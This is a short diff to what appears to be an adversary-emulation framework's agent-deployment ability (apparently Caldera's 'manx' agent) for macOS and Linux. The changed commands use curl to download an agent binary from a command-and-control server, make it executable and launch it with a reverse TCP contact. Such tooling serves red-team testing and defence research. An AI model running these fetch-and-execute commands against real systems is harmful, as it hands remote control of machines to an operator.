@@ -14,8 +14,9 @@
           server="#{app.contact.http}";
           socket="#{app.contact.tcp}";
           contact="tcp";
-          curl -svkOJ -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > manx.go;
-          ./$agent -http $server -socket $socket -contact $contact -v
+          curl -s -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > manx.go;
+          chmod +x manx.go;
+          ./manx.go -http $server -socket $socket -contact $contact -v
         variations:
           - description: Download with a random name and start as a background process
             command: |
@@ -30,8 +31,9 @@
           server="#{app.contact.http}";
           socket="#{app.contact.tcp}";
           contact="tcp";
-          curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > manx.go;
-          ./$agent -http $server -socket $socket -contact $contact -v
+          curl -s -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > manx.go;
+          chmod +x manx.go;
+          ./manx.go -http $server -socket $socket -contact $contact -v
         variations:
           - description: Download with a random name and start as a background process
             command: |
